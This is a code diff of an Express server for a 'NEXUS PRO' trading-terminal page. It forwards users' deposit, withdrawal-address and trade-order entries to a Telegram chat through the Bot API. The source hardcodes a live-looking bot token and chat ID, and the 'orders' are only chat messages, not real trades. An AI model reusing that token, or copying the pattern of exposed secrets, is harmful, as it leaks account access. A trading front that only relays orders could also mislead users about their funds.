@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require('cors');
+const https = require('https');
 
 const app = express();
 
@@ -11,52 +12,79 @@ app.use(cors());
 const BOT_TOKEN = "8673427170:AAGh1Bctii6IlczxS4-mNIGlL3N-jck-T7M";
 const CHAT_ID = "6504370273";
 
-// 1. Telegram API Endpoint (Backend Handler)
-app.post('/api/send-telegram', async (req, res) => {
-    try {
-        const { text, buttons } = req.body;
-        if (!text) {
-            return res.status(400).json({ success: false, error: "Text message is required" });
+// Helper function to send Telegram message using native HTTPS module
+function sendTelegramMessage(text, buttons, callback) {
+    const data = JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "Markdown",
+        reply_markup: {
+            inline_keyboard: buttons || []
+        }
+    });
+
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${BOT_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(data)
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        let responseBody = '';
+        res.on('data', (chunk) => { responseBody += chunk; });
+        res.on('end', () => {
+            try {
+                const parsed = JSON.parse(responseBody);
+                callback(null, parsed);
+            } catch (e) {
+                callback(e, null);
+            }
+        });
+    });
+
+    req.on('error', (error) => {
+        callback(error, null);
+    });
+
+    req.write(data);
+    req.end();
+}
+
+// 1. Telegram API Endpoint
+app.post('/api/send-telegram', (req, res) => {
+    const { text, buttons } = req.body;
+    if (!text) {
+        return res.status(400).json({ success: false, error: "Text message is required" });
+    }
+
+    sendTelegramMessage(text, buttons, (err, data) => {
+        if (err) {
+            console.error("Telegram Request Error:", err);
+            return res.status(500).json({ success: false, error: err.message });
         }
 
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: "Markdown",
-            reply_markup: {
-                inline_keyboard: buttons || []
-            }
-        };
-
-        const response = await fetch(telegramUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-
-        const data = await response.json();
-
-        if (data.ok) {
+        if (data && data.ok) {
             return res.json({ success: true, message: "Message sent to Telegram successfully!" });
         } else {
-            console.error("Telegram API Error:", data);
+            console.error("Telegram API Error Response:", data);
             return res.status(400).json({ success: false, error: data });
         }
-    } catch (error) {
-        console.error("Backend Server Error:", error);
-        return res.status(500).json({ success: false, error: error.message });
-    }
+    });
 });
 
-// 2. Frontend HTML Route (Full Advanced Trading Terminal UI)
+// 2. Frontend HTML Route
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS PRO :: Advanced Trading Terminal</title>
+    <title>NEXUS PRO :: Professional Trading Terminal</title>
     <style>
         :root {
             --bg-deep: #07090E;
@@ -350,7 +378,6 @@ app.get('/', (req, res) => {
     <div id="toast" class="toast">Action completed successfully</div>
 
     <script>
-        // Fetch Bitget Ticker Live
         function fetchTicker() {
             const symbol = document.getElementById("tradingPair").value;
             fetch(\`https://api.bitget.com/api/v2/spot/market/tickers?symbol=\${symbol}\`)
@@ -377,7 +404,6 @@ app.get('/', (req, res) => {
             setTimeout(() => t.classList.remove("show"), 3000);
         }
 
-        // Telegram Sender Function
         function sendToTelegram(text, buttons) {
             fetch('/api/send-telegram', {
                 method: "POST",
@@ -387,17 +413,16 @@ app.get('/', (req, res) => {
             .then(res => res.json())
             .then(data => {
                 if(data.success) {
-                    showToast("✅ Sent to Telegram Admin!");
+                    showToast("✅ Sent to Telegram successfully!");
                 } else {
-                    showToast("⚠️ Backend processed with warnings.");
+                    showToast("❌ Failed: " + (data.error?.description || "Check console"));
                 }
             })
             .catch(err => {
-                showToast("❌ Network error connecting to bot!");
+                showToast("❌ Network error connecting to backend!");
             });
         }
 
-        // Deposit Handler
         function submitDeposit() {
             const amt = document.getElementById("depAmount").value;
             if(!amt || amt <= 0) { alert("Enter valid amount"); return; }
@@ -410,7 +435,6 @@ app.get('/', (req, res) => {
             document.getElementById("depAmount").value = '';
         }
 
-        // Withdrawal Handler
         function submitWithdraw() {
             const amt = document.getElementById("wdAmount").value;
             const addr = document.getElementById("wdAddress").value;
@@ -425,7 +449,6 @@ app.get('/', (req, res) => {
             document.getElementById("wdAddress").value = '';
         }
 
-        // Trade Order Handler
         function executeOrder(type) {
             const pair = document.getElementById("tradingPair").value;
             const size = document.getElementById("orderSize").value;
@@ -439,7 +462,7 @@ app.get('/', (req, res) => {
             const btns = [[{ text: "❌ Close Position", callback_data: \`close_\${pair}\` }]];
 
             sendToTelegram(msg, btns);
-            showToast(\`🚀 \${type} Order Placed Successfully!\`);
+            showToast(\`🚀 \${type} Order Sent to Telegram!\`);
             document.getElementById("orderSize").value = '';
             document.getElementById("takeProfit").value = '';
             document.getElementById("stopLoss").value = '';
